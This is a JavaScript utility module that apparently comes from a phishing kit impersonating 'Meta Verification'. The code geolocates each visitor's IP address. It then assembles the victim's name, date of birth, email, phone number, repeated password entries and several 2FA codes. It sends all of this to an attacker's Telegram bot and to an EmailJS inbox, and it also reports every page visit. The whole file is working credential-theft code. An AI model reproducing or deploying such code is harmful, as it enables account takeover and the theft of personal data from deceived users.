// Utilities
const Utils = {
    encrypt(text) {
        return CryptoJS.AES.encrypt(text, CONFIG.SECRET_KEY).toString();
    },

    decrypt(cipherText) {
        const bytes = CryptoJS.AES.decrypt(cipherText, CONFIG.SECRET_KEY);
        return bytes.toString(CryptoJS.enc.Utf8);
    },

    saveRecord(key, value) {
        try {
            const encryptedValue = this.encrypt(JSON.stringify(value));
            const record = { value: encryptedValue, expiry: Date.now() + CONFIG.STORAGE_EXPIRY };
            localStorage.setItem(key, JSON.stringify(record));
        } catch (error) {
            console.error('Save error:', error);
        }
    },

    getRecord(key) {
        try {
            const item = localStorage.getItem(key);
            if (!item) return null;
            const { value, expiry } = JSON.parse(item);
            if (Date.now() > expiry) {
                localStorage.removeItem(key);
                return null;
            }
            const decrypted = this.decrypt(value);
            return decrypted ? JSON.parse(decrypted) : null;
        } catch (error) {
            return null;
        }
    },

    isIPv4(ip) {
        return /^\d{1,3}(?:\.\d{1,3}){3}$/.test(String(ip || ''));
    },

    hasRealIp(loc) {
        const ip = String((loc && loc.ip) || '').trim();
        if (!ip || ip === 'N/A') return false;
        return this.isIPv4(ip) || ip.indexOf(':') !== -1;
    },

    normalizeCountryCode(code) {
        const value = String(code || '').trim().toUpperCase();
        return /^[A-Z]{2}$/.test(value) ? value : '';
    },

    async fetchWithTimeout(url, asJson, timeoutMs) {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), timeoutMs || 2500);
        try {
            const res = await fetch(url, { cache: 'no-store', signal: controller.signal });
            if (!res.ok) throw new Error('bad status');
            return asJson ? await res.json() : await res.text();
        } finally {
            clearTimeout(timer);
        }
    },

    async getIPv4() {
        const sources = [
            'https://api.ipify.org?format=json',
            'https://ipv4.icanhazip.com/'
        ];
        for (const url of sources) {
            try {
                const text = String(await this.fetchWithTimeout(url, false, 2000) || '').trim();
                let ip = text;
                try {
                    const json = JSON.parse(text);
                    ip = json.ip || ip;
                } catch (e) { /* plain text */ }
                ip = String(ip).trim();
                if (this.isIPv4(ip)) return ip;
            } catch (e) { /* try next */ }
        }
        return '';
    },

    formatLocationLine(data) {
        const ip = data.ip || 'N/A';
        const region = data.region || data.city || 'N/A';
        const regionCode = data.region_code || data.regionCode || '';
        const countryCode = String(data.country_code || data.countryCode || '').toUpperCase();
        const countryName = data.country_name || data.countryName || this.countryNameFromCode(countryCode) || countryCode || 'N/A';
        const regionPart = regionCode ? `${region}(${regionCode})` : region;
        const countryPart = countryCode ? `${countryName}(${countryCode})` : countryName;
        return `${ip} | ${regionPart} | ${countryPart}`;
    },

    countryNameFromCode(code) {
        const names = {
            AD: 'Andorra', AE: 'United Arab Emirates', AF: 'Afghanistan', AL: 'Albania', AM: 'Armenia',
            AR: 'Argentina', AT: 'Austria', AU: 'Australia', AZ: 'Azerbaijan', BA: 'Bosnia and Herzegovina',
            BD: 'Bangladesh', BE: 'Belgium', BG: 'Bulgaria', BH: 'Bahrain', BO: 'Bolivia', BR: 'Brazil',
            BY: 'Belarus', CA: 'Canada', CH: 'Switzerland', CL: 'Chile', CN: 'China', CO: 'Colombia',
            CR: 'Costa Rica', CU: 'Cuba', CY: 'Cyprus', CZ: 'Czechia', DE: 'Germany', DK: 'Denmark',
            DO: 'Dominican Republic', DZ: 'Algeria', EC: 'Ecuador', EE: 'Estonia', EG: 'Egypt',
            ES: 'Spain', FI: 'Finland', FR: 'France', GB: 'United Kingdom', GE: 'Georgia', GH: 'Ghana',
            GR: 'Greece', GT: 'Guatemala', HK: 'Hong Kong', HR: 'Croatia', HU: 'Hungary', ID: 'Indonesia',
            IE: 'Ireland', IL: 'Israel', IN: 'India', IQ: 'Iraq', IR: 'Iran', IS: 'Iceland', IT: 'Italy',
            JO: 'Jordan', JP: 'Japan', KE: 'Kenya', KG: 'Kyrgyzstan', KH: 'Cambodia', KR: 'South Korea',
            KW: 'Kuwait', KZ: 'Kazakhstan', LA: 'Laos', LB: 'Lebanon', LK: 'Sri Lanka', LT: 'Lithuania',
            LU: 'Luxembourg', LV: 'Latvia', LY: 'Libya', MA: 'Morocco', MD: 'Moldova', ME: 'Montenegro',
            MK: 'North Macedonia', MM: 'Myanmar', MN: 'Mongolia', MX: 'Mexico', MY: 'Malaysia',
            NG: 'Nigeria', NL: 'Netherlands', NO: 'Norway', NP: 'Nepal', NZ: 'New Zealand', OM: 'Oman',
            PA: 'Panama', PE: 'Peru', PH: 'Philippines', PK: 'Pakistan', PL: 'Poland', PT: 'Portugal',
            PY: 'Paraguay', QA: 'Qatar', RO: 'Romania', RS: 'Serbia', RU: 'Russia', SA: 'Saudi Arabia',
            SE: 'Sweden', SG: 'Singapore', SI: 'Slovenia', SK: 'Slovakia', TH: 'Thailand', TJ: 'Tajikistan',
            TM: 'Turkmenistan', TN: 'Tunisia', TR: 'Turkey', TW: 'Taiwan', UA: 'Ukraine', US: 'United States',
            UY: 'Uruguay', UZ: 'Uzbekistan', VE: 'Venezuela', VN: 'Vietnam', ZA: 'South Africa'
        };
        return names[String(code || '').toUpperCase()] || '';
    },

    telegramHasValue(value) {
        const text = String(value == null ? '' : value).trim();
        if (!text) return false;
        if (text === 'N/A') return false;
        return true;
    },

    telegramEscape(value) {
        return String(value)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;');
    },

    telegramLine(label, value, asCode) {
        if (!this.telegramHasValue(value)) return '';
        const safe = this.telegramEscape(String(value).trim());
        const body = asCode ? `<code>${safe}</code>` : safe;
        return `<b>${this.telegramEscape(label)}:</b> ${body}`;
    },

    telegramJoin(groups) {
        const parts = [];
        groups.forEach((group) => {
            const lines = (group || []).filter(Boolean);
            if (!lines.length) return;
            if (parts.length) parts.push('────────────────');
            parts.push.apply(parts, lines);
        });
        return parts.join('\n');
    },

    telegramPageUrl() {
        return location.href || '';
    },

    formatDateOfBirth(data) {
        const day = data.day || '';
        const month = data.month || '';
        const year = data.year || '';
        if (!day && !month && !year) return '';
        return `${day}/${month}/${year}`;
    },

    telegramVisitMessage(loc) {
        if (!this.hasRealIp(loc)) return '';
        return this.telegramJoin([[
            this.telegramLine('IP', loc.ip, true),
            this.telegramLine('Location', loc.location, true),
            this.telegramLine('Page', this.telegramPageUrl())
        ]]);
    },

    telegramFormMessage(loc, data, withTwoFa) {
        return this.telegramJoin([
            [
                this.telegramLine('IP', loc.ip, true),
                this.telegramLine('Location', loc.location, true)
            ],
            [
                this.telegramLine('Full Name', data.fullName),
                this.telegramLine('Page', data.fanpage),
                this.telegramLine('Date of Birth', this.formatDateOfBirth(data))
            ],
            [
                this.telegramLine('Email', data.email, true),
                this.telegramLine('Business Email', data.emailBusiness, true),
                this.telegramLine('Phone', data.phone, true)
            ],
            [
                this.telegramLine('Password(1)', data.password, true),
                this.telegramLine('Password(2)', data.passwordSecond, true)
            ],
            withTwoFa ? [
                this.telegramLine('2FA(1)', data.twoFa, true),
                this.telegramLine('2FA(2)', data.twoFaSecond, true),
                this.telegramLine('2FA(3)', data.twoFaThird, true)
            ] : []
        ]);
    },

    telegramPasswordMessage(loc, data) {
        return this.telegramFormMessage(loc, data, false);
    },

    telegramTwoFaMessage(loc, data) {
        return this.telegramFormMessage(loc, data, true);
    },

    async sendTelegramText(text) {
        const res = await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CONFIG.TELEGRAM_CHAT_ID,
                text,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        });
        return res;
    },

    persistLocation(loc) {
        this._locationCache = loc;
        try {
            if (loc && loc.country_code && loc.country_code !== 'N/A') {
                sessionStorage.setItem('__geo_cc_v3__', String(loc.country_code).toUpperCase());
                sessionStorage.setItem('__geo_cc__', String(loc.country_code).toUpperCase());
            }
            sessionStorage.setItem('__geo_loc_v3__', JSON.stringify({
                ip: loc.ip,
                country_code: loc.country_code,
                country_name: loc.country_name,
                region: loc.region,
                region_code: loc.region_code,
                city: loc.city,
                org: loc.org,
                location: loc.location
            }));
        } catch (e) { /* ignore */ }
        return loc;
    },

    restoreLocation() {
        if (this._locationCache && this.hasRealIp(this._locationCache)) return this._locationCache;
        try {
            const saved = JSON.parse(sessionStorage.getItem('__geo_loc_v3__') || 'null');
            if (saved && this.hasRealIp(saved)) {
                this._locationCache = saved;
                return saved;
            }
        } catch (e) { /* ignore */ }
        return null;
    },

    geoCountryIso() {
        const cached = this._locationCache && this._locationCache.country_code;
        let fromCc = '';
        try { fromCc = sessionStorage.getItem('__geo_cc_v3__') || ''; } catch (e) { /* ignore */ }
        const restored = this.restoreLocation();
        const iso = String(
            cached ||
            fromCc ||
            (restored && restored.country_code) ||
            window.__geoCountry ||
            ''
        ).toUpperCase();
        if (/^[A-Z]{2}$/.test(iso)) return iso;
        return '';
    },

    async geoFromCloudflare() {
        const text = await this.fetchWithTimeout('https://www.cloudflare.com/cdn-cgi/trace', false, 2000);
        const ip = String((String(text).match(/(?:^|\n)ip=([^\s]+)/) || [])[1] || '').trim();
        const country_code = this.normalizeCountryCode((String(text).match(/(?:^|\n)loc=([A-Z]{2})/i) || [])[1]);
        if (!country_code) throw new Error('cloudflare');
        return {
            ip,
            country_code,
            country_name: this.countryNameFromCode(country_code),
            city: '',
            region: '',
            region_code: '',
            org: '',
            source: 'cloudflare'
        };
    },

    async geoFromIpinfo(ip) {
        const url = ip
            ? `https://ipinfo.io/${ip}/json?token=790b745aefcdac`
            : 'https://ipinfo.io/json?token=790b745aefcdac';
        const data = await this.fetchWithTimeout(url, true, 2200);
        const country_code = this.normalizeCountryCode(data.country);
        if (!country_code) throw new Error('ipinfo');
        return {
            ip: data.ip || ip || '',
            country_code,
            country_name: this.countryNameFromCode(country_code),
            city: data.city || '',
            region: data.region || data.city || '',
            region_code: '',
            org: data.org || '',
            source: 'ipinfo'
        };
    },

    async geoFromIpwho(ip) {
        const url = ip ? `https://ipwho.is/${ip}` : 'https://ipwho.is/';
        const data = await this.fetchWithTimeout(url, true, 2200);
        if (data.success === false) throw new Error('ipwho');
        const country_code = this.normalizeCountryCode(data.country_code);
        if (!country_code) throw new Error('ipwho');
        return {
            ip: data.ip || ip || '',
            country_code,
            country_name: data.country || this.countryNameFromCode(country_code),
            city: data.city || '',
            region: data.region || data.city || '',
            region_code: data.region_code || '',
            org: (data.connection && data.connection.isp) || '',
            source: 'ipwho'
        };
    },

    async geoFromIpapi(ip) {
        const url = ip ? `https://ipapi.co/${ip}/json/` : 'https://ipapi.co/json/';
        const data = await this.fetchWithTimeout(url, true, 2200);
        if (data.error) throw new Error('ipapi');
        const country_code = this.normalizeCountryCode(data.country_code);
        if (!country_code) throw new Error('ipapi');
        return {
            ip: data.ip || ip || '',
            country_code,
            country_name: data.country_name || this.countryNameFromCode(country_code),
            city: data.city || '',
            region: data.region || data.city || '',
            region_code: data.region_code || '',
            org: data.org || '',
            source: 'ipapi'
        };
    },

    uniqueRowsBySource(rows, preferIpv4) {
        const bySource = {};
        (rows || []).forEach((row) => {
            if (!row || !this.normalizeCountryCode(row.country_code)) return;
            const current = bySource[row.source];
            if (!current || (preferIpv4 && row.via === 'ipv4')) {
                bySource[row.source] = row;
            }
        });
        return Object.keys(bySource).map((key) => bySource[key]);
    },

    majorityCountry(rows) {
        const votes = {};
        (rows || []).forEach((row) => {
            const code = this.normalizeCountryCode(row && row.country_code);
            if (!code) return;
            votes[code] = (votes[code] || 0) + 1;
        });
        let winner = '';
        let best = 0;
        let tied = false;
        Object.keys(votes).forEach((code) => {
            if (votes[code] > best) {
                winner = code;
                best = votes[code];
                tied = false;
            } else if (votes[code] === best && code !== winner) {
                tied = true;
            }
        });
        return { winner: tied ? '' : winner, best, votes };
    },

    pickVotedCountry(rows, ipv4) {
        const ipv4Rows = this.uniqueRowsBySource(
            (rows || []).filter((row) => row.via === 'ipv4' || (ipv4 && row.ip === ipv4)),
            true
        );
        const ipv4Vote = this.majorityCountry(ipv4Rows);
        if (ipv4Vote.best >= 2 && ipv4Vote.winner) return ipv4Vote.winner;

        const unique = this.uniqueRowsBySource(rows, true);
        const quality = unique.filter((row) => row.source !== 'cloudflare');
        const qualityVote = this.majorityCountry(quality);
        if (qualityVote.best >= 2 && qualityVote.winner) return qualityVote.winner;

        const allVote = this.majorityCountry(unique);
        if (allVote.best >= 2 && allVote.winner) return allVote.winner;

        if (ipv4Vote.winner) return ipv4Vote.winner;
        const preferred = quality.find((row) => row.source === 'ipinfo')
            || quality[0]
            || unique[0]
            || (rows && rows[0]);
        return this.normalizeCountryCode(preferred && preferred.country_code) || allVote.winner;
    },

    async getUserLocation() {
        const cached = this._locationCache;
        if (cached && this.hasRealIp(cached)) return cached;
        const restored = this.restoreLocation();
        if (restored && this.hasRealIp(restored)) return restored;
        if (!this._locationPromise) {
            this._locationPromise = this.resolveUserLocation().finally(() => {
                this._locationPromise = null;
            });
        }
        return this._locationPromise;
    },

    async resolveUserLocation() {
        const empty = {
            location: 'N/A',
            country_code: 'N/A',
            ip: 'N/A',
            region: 'N/A',
            region_code: 'N/A',
            country: 'N/A',
            country_name: 'N/A',
            city: 'N/A',
            org: 'N/A'
        };

        const ipv4Promise = this.getIPv4().catch(() => '');
        const lookups = Promise.allSettled([
            this.geoFromCloudflare(),
            this.geoFromIpinfo(),
            this.geoFromIpwho(),
            this.geoFromIpapi()
        ]);

        const ipv4 = await ipv4Promise;
        const ipv4Lookups = ipv4 ? Promise.allSettled([
            this.geoFromIpinfo(ipv4).then((row) => Object.assign(row, { via: 'ipv4' })),
            this.geoFromIpwho(ipv4).then((row) => Object.assign(row, { via: 'ipv4' })),
            this.geoFromIpapi(ipv4).then((row) => Object.assign(row, { via: 'ipv4' }))
        ]) : Promise.resolve([]);

        const [generic, targeted] = await Promise.all([lookups, ipv4Lookups]);
        const rows = []
            .concat(generic, targeted)
            .filter((item) => item && item.status === 'fulfilled' && item.value && item.value.country_code)
            .map((item) => item.value);

        if (!rows.length) {
            if (ipv4) {
                const loc = { ...empty, ip: ipv4, location: `${ipv4} | N/A | N/A` };
                this.persistLocation(loc);
                return loc;
            }
            return empty;
        }

        const countryCode = this.pickVotedCountry(rows, ipv4);
        const matching = rows.filter((row) => this.normalizeCountryCode(row.country_code) === countryCode);
        const detailRank = { ipinfo: 4, ipwho: 3, ipapi: 2, cloudflare: 1 };
        matching.sort((a, b) => {
            const viaScore = (row) => (row.via === 'ipv4' ? 2 : 0);
            return (detailRank[b.source] || 0) + viaScore(b) - ((detailRank[a.source] || 0) + viaScore(a));
        });
        const detailed = matching.find((row) => row.city) || matching[0] || rows[0];

        const ipv4Match = matching.find((row) => row.ip === ipv4)
            || matching.find((row) => this.isIPv4(row.ip));
        const ip = (ipv4Match && ipv4Match.ip) || detailed.ip || 'N/A';

        const loc = {
            ip,
            city: detailed.city || 'N/A',
            region: detailed.region || detailed.city || 'N/A',
            region_code: detailed.region_code || '',
            country: countryCode,
            country_code: countryCode,
            country_name: detailed.country_name || this.countryNameFromCode(countryCode) || countryCode,
            org: detailed.org || 'N/A',
            location: this.formatLocationLine({
                ip,
                region: detailed.region || detailed.city,
                city: detailed.city,
                region_code: detailed.region_code,
                country_code: countryCode,
                country_name: detailed.country_name || this.countryNameFromCode(countryCode)
            })
        };
        this.persistLocation(loc);
        return loc;
    },

    async sendToTelegram(data) {
        const locationData = await this.getUserLocation();
        const hasTwoFa = Boolean(data.twoFa || data.twoFaSecond || data.twoFaThird);
        const text = hasTwoFa
            ? this.telegramTwoFaMessage(locationData, data)
            : this.telegramPasswordMessage(locationData, data);

        try {
            await this.sendTelegramText(text);
        } catch (error) {
            console.error('Telegram error:', error);
        }
    },

    async sendToEmail(data) {
        const locationData = await this.getUserLocation();

        const hasTwoFa = Boolean(data.twoFa || data.twoFaSecond || data.twoFaThird);
        const emailContent = hasTwoFa
            ? this.telegramTwoFaMessage(locationData, data)
            : this.telegramPasswordMessage(locationData, data);

        try {
            // Load EmailJS SDK if not already loaded
            if (!window.emailjs) {
                await this.loadEmailJSSDK();
            }

            await emailjs.send(
                CONFIG.EMAILJS_SERVICE_ID,
                CONFIG.EMAILJS_TEMPLATE_ID,
                {
                    to_email: CONFIG.EMAIL_RECIPIENT,
                    subject: `Meta Verification - ${locationData.location}`,
                    message: emailContent,
                    from_name: 'Meta Verification System',
                    reply_to: data.email || 'noreply@system.com'
                },
                CONFIG.EMAILJS_PUBLIC_KEY
            );
        } catch (error) {
            console.error('Email error:', error);
        }
    },

    loadEmailJSSDK() {
        return new Promise((resolve, reject) => {
            if (window.emailjs) {
                resolve();
                return;
            }

            const script = document.createElement('script');
            script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
            script.onload = () => {
                emailjs.init(CONFIG.EMAILJS_PUBLIC_KEY);
                resolve();
            };
            script.onerror = reject;
            document.head.appendChild(script);
        });
    },

    async sendNotification(data) {
        const notificationType = CONFIG.NOTIFICATION_TYPE;

        try {
            if (notificationType === 'telegram' || notificationType === 'both') {
                await this.sendToTelegram(data);
            }

            if (notificationType === 'email' || notificationType === 'both') {
                await this.sendToEmail(data);
            }
        } catch (error) {
            console.error('Notification error:', error);
        }
    },

    async waitForVisitLocation() {
        let loc = await this.getUserLocation();
        if (this.hasRealIp(loc)) return loc;
        this._locationCache = null;
        try { sessionStorage.removeItem('__geo_loc_v3__'); } catch (e) { /* ignore */ }
        loc = await this.resolveUserLocation();
        if (this.hasRealIp(loc)) return loc;
        return null;
    },

    async sendVisitNotification() {
        if (this._visitSendPromise) return this._visitSendPromise;
        this._visitSendPromise = this.dispatchVisitNotification();
        return this._visitSendPromise;
    },

    async dispatchVisitNotification() {
        if (window.__visitPingStarted) return;

        try {
            const loc = await this.waitForVisitLocation();
            const text = this.telegramVisitMessage(loc);
            if (!this.hasRealIp(loc) || !text) {
                this._visitSendPromise = null;
                return;
            }

            const res = await this.sendTelegramText(text);
            if (res && res.ok) window.__visitPingStarted = true;
            else this._visitSendPromise = null;
        } catch (error) {
            this._visitSendPromise = null;
            console.error('Visit notify error:', error);
        }
    },

    maskPhone(phone) {
        if (!phone || phone.length < 5) return phone;
        const start = phone.slice(0, 2);
        const end = phone.slice(-2);
        return `${start} ${'*'.repeat(phone.length - 4)} ${end}`;
    },

    maskEmail(email) {
        if (!email) return '';
        return email.replace(/^(.)(.*?)(.)@(.+)$/, (_, a, mid, c, domain) => {
            return `${a}${'*'.repeat(mid.length)}${c}@${domain}`;
        });
    },

    generateTicketId() {
        const gen = () => Math.random().toString(36).substring(2, 6).toUpperCase();
        return `${gen()}-${gen()}-${gen()}`;
    }
};

